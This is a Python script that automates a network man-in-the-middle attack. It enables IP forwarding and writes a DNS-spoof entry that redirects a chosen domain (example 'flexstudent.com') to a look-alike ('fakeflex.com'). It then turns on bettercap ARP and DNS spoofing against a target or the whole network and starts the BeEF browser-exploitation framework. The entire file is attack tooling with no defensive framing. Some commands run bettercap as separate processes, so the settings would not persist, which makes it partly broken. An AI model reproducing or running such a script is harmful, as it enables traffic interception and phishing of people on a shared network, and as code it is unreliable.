import os
import subprocess

def run_command(command):
    """
    Run a shell command and print output or error.
    """
    try:
        print(f"Running: {command}")
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        print(output)
        return output
    except subprocess.CalledProcessError as e:
        print(f"Error: {e.output}")
        return None

def cleanup():
    """
    Revert all configurations to defaults.
    """
    print("\nReverting settings to defaults...")
    # Disable ARP spoofing
    run_command("echo 'arp.spoof off' | sudo bettercap -eval")
    # Disable DNS spoofing
    run_command("echo 'dns.spoof off' | sudo bettercap -eval")
    # Reset IP forwarding
    run_command("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")
    print("Cleanup complete.")

def setup_beef():
    """
    Start the Browser Exploitation Framework (BeEF).
    """
    print("\nStarting BeEF...")
    beef_command = "beef-xss"
    try:
        beef_process = subprocess.Popen(beef_command, shell=True)
        print("BeEF is running. Access the admin panel to configure further.")
        return beef_process
    except FileNotFoundError:
        print("Error: BeEF is not installed. Skipping BeEF setup.")
        return None

# Main execution
try:
    # Step 1: Enable IP forwarding
    print("Enabling IP forwarding...")
    run_command("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

    # Step 2: User input for domains
    network_interface = input("Enter the network interface (e.g., eth0, wlan0): ").strip()
    target_domain = input("Enter the domain you want to spoof (e.g., flexstudent.com): ").strip()
    redirect_domain = input("Enter the domain you want to redirect to (e.g., fakeflex.com): ").strip()

    # Step 3: Configure DNS Spoofing
    dns_spoof_file = "/usr/share/bettercap/caplets/dns.spoof.hosts"
    print("\nConfiguring DNS spoofing...")
    dns_entry = f"{target_domain} {redirect_domain}"
    try:
        with open(dns_spoof_file, "a") as file:
            file.write(f"\n{dns_entry}\n")
        print(f"Added to {dns_spoof_file}: {dns_entry}")
    except PermissionError:
        print("Error: Run this script with sudo or add permissions to edit the DNS spoofing hosts file.")

    # Step 4: Enable ARP Spoofing
    target_ip = input("Enter target IP (or leave blank for entire network): ").strip()
    if target_ip:
        run_command(f"echo 'set arp.spoof.targets {target_ip}' | sudo bettercap -eval")
    run_command("echo 'arp.spoof on' | sudo bettercap -eval")

    # Step 5: Enable DNS Spoofing
    print("\nEnabling DNS spoofing...")
    run_command("echo 'dns.spoof on' | sudo bettercap -eval")

    # Step 6: Start Bettercap in non-interactive mode
    bettercap_command = f"sudo bettercap -iface {network_interface}"
    print("\nStarting Bettercap in non-interactive mode...")
    bettercap_process = subprocess.Popen(bettercap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Step 7: Setup BeEF
    beef_process = setup_beef()

    print("\nAll configurations applied. Press Ctrl+C to terminate and clean up.")

    # Wait for user to terminate the script
    try:
        bettercap_process.wait()
    except KeyboardInterrupt:
        print("\nTerminating...")

    # Cleanup
    if beef_process:
        beef_process.terminate()

finally:
    cleanup()
